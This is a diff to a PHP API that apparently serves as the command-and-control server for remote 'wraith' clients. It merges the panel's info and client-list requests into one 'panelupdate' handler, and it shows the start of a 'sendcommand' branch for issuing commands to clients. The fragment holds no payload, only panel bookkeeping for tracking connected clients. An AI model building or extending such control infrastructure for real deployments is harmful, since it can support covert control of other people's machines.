@@ -269,32 +269,39 @@ if ($response["requester_type"] === "wraith") {
 // Only do this if we're talking to the panel
 } elseif ($response["requester_type"] === "panel") {
 	$req_type = $request["message_type"];
-	if ($req_type === "getinfo") {
-		// Get some information about the server and connected wraiths
-		$db = get_db();
-		$cmds = get_cmds();
-		$cmd_names = [];
-		foreach ($cmds as $name => $path) { array_push($cmd_names, $name); }
-		$response["status"] = "SUCCESS";
-		$response["data"] = json_encode([
-			"Active Wraith Count" => sizeof($db["active_wraith_clients"]),
-			"Available Command Count" => sizeof($cmds),
-			"Available Commands" => implode(", ", $cmd_names),
-			"API Address" => get_current_url($_SERVER),
-		]);
-		respond();
+	if ($req_type === "panelupdate") {
+		try {
+			// Get some information about the server and connected wraiths
+			$db = get_db();
+			
+			// General info section
+			$cmds = get_cmds();
+			$cmd_names = [];
+			foreach ($cmds as $name => $path) { array_push($cmd_names, $name); }
+			$serverinfo = [
+				"Active Wraith Count" => sizeof($db["active_wraith_clients"]),
+				"Available Command Count" => sizeof($cmds),
+				"Available Commands" => implode(", ", $cmd_names),
+				"API Address" => get_current_url($_SERVER),
+			];
 
-	} elseif ($req_type === "getwraiths") {
-		// Get a list of all wraiths and their attributes
-		$db = get_db();
-		$wraiths = $db["active_wraith_clients"];
-		$wraiths_dict = ["Wraith ID" => "Wraith Details"];
-		foreach ($db["active_wraith_clients"] as $id => $values) {
-			$wraiths_dict[$id] = json_encode($values, JSON_PRETTY_PRINT);
+			// Wraith info section
+			$wraiths = $db["active_wraith_clients"];
+			$wraiths_dict = ["Wraith ID" => "Wraith Details"];
+			foreach ($db["active_wraith_clients"] as $id => $values) {
+				$wraiths_dict[$id] = json_encode($values, JSON_PRETTY_PRINT);
+			}
+			
+			// Response section
+			$response["status"] = "SUCCESS";
+			$response["serverinfo"] = json_encode($serverinfo);
+			$response["wraithinfo"] = json_encode($wraiths_dict);
+			respond();
+		} catch (Exception $e) {
+			$response["status"] = "ERROR";
+			$response["message"] = "Error while getting info for panel update";
+			respond();
 		}
-		$response["status"] = "SUCCESS";
-		$response["data"] = json_encode($wraiths_dict);
-		respond();
 		
 	} elseif ($req_type === "sendcommand") {
 		// Send a command to a/multiple wraith/s
